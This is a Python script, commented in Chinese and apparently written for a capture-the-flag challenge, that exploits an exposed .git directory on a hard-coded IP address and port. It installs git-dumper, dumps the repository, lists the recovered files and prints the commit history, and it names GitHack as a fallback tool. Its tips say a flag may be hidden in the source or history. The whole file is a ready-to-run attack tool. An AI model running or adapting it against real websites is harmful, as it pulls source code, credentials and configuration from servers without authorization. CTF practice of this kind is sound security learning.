#!/usr/bin/env python3
"""
Git源码泄露利用工具
目标：http://47.113.178.182:32821/
"""

import os
import sys
import subprocess

target_url = "http://47.113.178.182:32821/.git/"
output_dir = "./git_leak_output"

print("""
╔════════════════════════════════════════════════════════════╗
║           Git 源码泄露利用工具                             ║
║           目标: http://47.113.178.182:32821/              ║
╚════════════════════════════════════════════════════════════╝
""")

print("[*] 检查 git-dumper 工具...")

# 检查是否安装了 git-dumper
try:
    result = subprocess.run(['pip3', 'show', 'git-dumper'],
                          capture_output=True, text=True)
    if result.returncode != 0:
        print("[!] git-dumper 未安装，正在安装...")
        subprocess.run(['pip3', 'install', 'git-dumper'], check=True)
        print("[+] git-dumper 安装成功！")
    else:
        print("[+] git-dumper 已安装")
except Exception as e:
    print(f"[!] 错误: {e}")
    print("\n[*] 请手动安装: pip3 install git-dumper")
    sys.exit(1)

# 创建输出目录
if not os.path.exists(output_dir):
    os.makedirs(output_dir)
    print(f"[+] 创建输出目录: {output_dir}")

print(f"\n[*] 开始下载 Git 仓库...")
print(f"[*] 目标: {target_url}")
print(f"[*] 输出: {output_dir}\n")

# 使用 git-dumper 下载
try:
    subprocess.run(['git-dumper', target_url, output_dir], check=True)
    print("\n[+] Git 仓库下载完成！")

    # 列出下载的文件
    print("\n[*] 下载的文件:")
    for root, dirs, files in os.walk(output_dir):
        # 跳过 .git 目录的详细列表
        if '.git' in root:
            continue
        for file in files:
            filepath = os.path.join(root, file)
            print(f"  • {filepath}")

    # 查看 Git 日志
    print("\n[*] Git 提交历史:")
    os.chdir(output_dir)
    subprocess.run(['git', 'log', '--oneline'], check=False)

    print("\n[*] 提示：")
    print("    1. 检查所有下载的源码文件")
    print("    2. 使用 'git log' 查看提交历史")
    print("    3. 使用 'git show <commit>' 查看特定提交的内容")
    print("    4. 使用 'git diff' 查看代码差异")
    print("    5. flag 可能在源码、配置文件或 git 历史记录中")

except Exception as e:
    print(f"[!] 下载失败: {e}")
    print("\n[*] 备选方案：使用 GitHack")
    print("    git clone https://github.com/lijiejie/GitHack")
    print("    python GitHack.py http://47.113.178.182:32821/.git/")
